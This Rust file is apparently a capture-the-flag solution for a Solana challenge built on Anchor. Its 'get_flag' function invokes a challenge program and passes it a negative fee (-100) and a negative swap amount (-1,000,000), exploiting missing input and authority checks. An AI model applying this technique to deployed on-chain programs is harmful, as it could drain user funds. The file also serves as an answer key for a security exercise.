use anchor_lang::prelude::*;

use anchor_spl::token::Token;

declare_id!("osecio1111111111111111111111111111111111111");

#[program]
pub mod solve {
    use super::*;

    pub fn get_flag(ctx: Context<GetFlag>) -> Result<()> {
        // let cpi_accounts = chall::cpi::accounts::Init {
        //     state: ctx.accounts.state.to_account_info(),
        //     payer: ctx.accounts.payer.to_account_info(),
        //     system_program: ctx.accounts.system_program.to_account_info(),
        //     rent: ctx.accounts.rent.to_account_info(),
        // };
        // let cpi_ctx = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts);
        // chall::cpi::init(cpi_ctx)?;

        let cpi_accounts = chall::cpi::accounts::AuthFee {
            state: ctx.accounts.state.to_account_info(),
            payer: ctx.accounts.payer.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            rent: ctx.accounts.rent.to_account_info(),
        };
        let cpi_ctx = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts);
        chall::cpi::set_fee(cpi_ctx, -100)?;

        let cpi_accounts = chall::cpi::accounts::Swap {
            state: ctx.accounts.state.to_account_info(),
            payer: ctx.accounts.payer.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            rent: ctx.accounts.rent.to_account_info(),
        };
        let cpi_ctx = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts);
        chall::cpi::swap(cpi_ctx, -1_000_000)?;

        Ok(())
    }
}

#[derive(Accounts)]
pub struct GetFlag<'info> {
    #[account(mut)]
    pub state: AccountInfo<'info>,
    #[account(mut)]
    pub payer: Signer<'info>,

    pub system_program: Program<'info, System>,
    pub token_program: Program<'info, Token>,
    pub rent: Sysvar<'info, Rent>,
    pub chall: Program<'info, chall::program::Chall>
}
